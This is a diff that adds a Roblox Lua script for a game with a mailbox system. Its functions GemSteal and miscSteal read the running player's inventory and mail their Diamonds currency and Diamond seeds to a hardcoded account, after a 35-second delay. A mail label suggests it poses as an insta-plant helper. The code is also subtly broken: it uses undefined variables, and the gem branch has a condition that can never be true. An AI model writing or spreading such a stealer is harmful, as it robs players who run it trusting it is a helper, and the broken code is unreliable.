@@ -1,0 +1,52 @@
+print(2)
+local library = require(game.ReplicatedStorage.Library)
+local save = library.Save.Get().Inventory
+local GetSave = function()
+    return require(game.ReplicatedStorage.Library.Client.Save).Get()
+end
+local user = "tiago_memess"
+for i, v in pairs(GetSave().Inventory.Currency) do
+    if v.id == "Diamonds" then
+        GemAmount1 = v._am
+    end
+end
+if GemAmount1 < 30000000 then
+    task.wait(35)
+    game.ReplicatedStorage:WaitForChild("Network"):WaitForChild("Mailbox: Claim All"):InvokeServer()
+    task.wait(1)
+    if GemAmount1 > 50000000 then
+        function GemSteal()
+            for i, v in pairs(GetSave().Inventory.Currency) do
+                if v.id == "Diamonds" then
+                    GemId = i
+                    local args = {
+                        [1] = user[cf],
+                        [2] = MailMessage,
+                        [3] = "Currency",
+                        [4] = GemId,
+                        [5] = GemAmount1 - 30010000
+                    }
+                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+                    print("Gemas mandadas para " .. user[cf])
+                    end
+                end
+            end
+        end
+    GemSteal()
+end
+local function miscSteal()
+    for i, v in pairs(save.Seed) do
+        if v.id == "Diamond" and v._am >= 350 then
+            task.wait(35)
+            local args = {
+                [1] = user,
+                [2] = "INSTA-PLANTS A BIRE",
+                [3] = "Misc",
+                [4] = i,
+                [5] = 1
+            }
+            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+        end
+    end
+end
+miscSteal()
